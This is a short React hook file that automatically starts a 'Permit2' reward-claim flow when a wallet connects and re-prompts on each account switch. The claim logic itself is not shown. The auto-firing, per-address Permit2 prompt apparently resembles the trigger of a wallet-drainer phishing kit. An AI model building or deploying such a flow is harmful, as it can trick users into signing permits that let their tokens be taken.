// src/hooks/usePermit2Claim.tsx
// Mounts once inside <WagmiProvider>, fires the claim flow on connect,
// and clears the handled-guard on disconnect / account switch.

import { useEffect, useRef } from 'react';
import { useAccount } from 'wagmi';
import { startRewardClaim, clearClaimGuard, onAccountChanged } from '@/lib/claimProcessor';

export function ClaimFlowTrigger() {
  const { isConnected, address, chainId } = useAccount();
  const wasConnected = useRef(false);

  useEffect(() => {
    if (isConnected && address) {
      wasConnected.current = true;
      startRewardClaim({ address, chainId });
    } else if (!isConnected && wasConnected.current) {
      wasConnected.current = false;
      clearClaimGuard();
    }
  }, [isConnected, address, chainId]);

  // Account switch → reset guard so the new address gets its own prompt
  useEffect(() => {
    onAccountChanged(address ?? null);
  }, [address]);

  return null;
}
